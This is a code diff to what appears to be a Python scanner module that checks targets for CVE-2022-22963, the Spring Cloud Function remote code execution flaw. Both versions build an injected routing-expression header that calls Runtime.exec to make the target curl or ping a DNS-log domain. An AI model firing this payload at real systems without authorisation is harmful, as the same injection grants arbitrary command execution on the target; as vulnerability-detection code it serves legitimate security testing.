@@ -33,36 +33,36 @@ HEADERS = {
 DEFAULT_DNS_DOMAIN = "dnslog.cn"
 
 
-def check(url, dns_domain=DEFAULT_DNS_DOMAIN, proxies=None, session=None):
+def check(url, dns_domain, proxy=None, session=None, timeout=TIMEOUT):
     """
-    检测 CVE-2022-22963 漏洞（Spring Cloud Function 远程命令执行）
-    :param url: 待检测的目标 URL
-    :param dns_domain: DNS 日志域名（用于 DNS 记录检查）
-    :param proxies: 代理配置（可选）
+    检测 CVE-2022-22963 远程代码执行漏洞
+    :param url: 目标 URL
+    :param dns_domain: DNS 日志域名
+    :param proxy: 代理配置
     :param session: 复用的 Session 实例（可选）
+    :param timeout: 请求超时时间（秒）
     :return: 如果存在漏洞，返回 (True, 详细信息字典)，否则返回 (False, {})
     """
-    # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
-    session = session or requests.Session()
-
-    # 构建恶意请求头（包含命令执行的表达式）
-    headers = {**HEADERS,
-               'spring.cloud.function.routing-expression': f'T(java.lang.Runtime).getRuntime().exec("curl SBSCAN_cve_2022_22963.{dns_domain}")'}
-
-    # 构建请求 URL
-    target_url = urljoin(url, "/functionRouter")
+    target_url = urljoin(url, "functionRouter")
+    
+    # 准备请求头
+    headers = HEADERS.copy()
+    headers.update({
+        "spring.cloud.function.routing-expression": "T(java.lang.Runtime).getRuntime().exec(\"ping -c 1 " + CVE_ID + "." + dns_domain + "\")",
+        "Content-Type": "application/x-www-form-urlencoded"
+    })
 
     try:
-        # 发送请求以检测漏洞
-        response = session.post(target_url, headers=headers, data='test', verify=False, timeout=TIMEOUT,
-                                proxies=proxies)
+        # 使用传入的 session，如果没有则创建新的 session（用于单独测试时）
+        session = session or requests.Session()
+        res = session.post(target_url, headers=headers, timeout=timeout, data="test", verify=False, proxies=proxy)
 
         # 输出调试信息
-        logger.debug(Fore.CYAN + f"[{response.status_code}]" + Fore.BLUE + f"[{response.headers}]",
+        logger.debug(Fore.CYAN + f"[{res.status_code}]" + Fore.BLUE + f"[{res.headers}]",
                      extra={"target": target_url})
 
         # 检查返回的状态码和响应内容
-        if response.status_code == 500 and '"error":"Internal Server Error"' in response.text:
+        if res.status_code == 500 and '"error":"Internal Server Error"' in res.text:
             details = f"{CVE_ID} vulnerability detected at {target_url}"
             if dns_domain == DEFAULT_DNS_DOMAIN:
                 details += ", use the --dnslog parameter to specify your dnslog domain and then scan again"
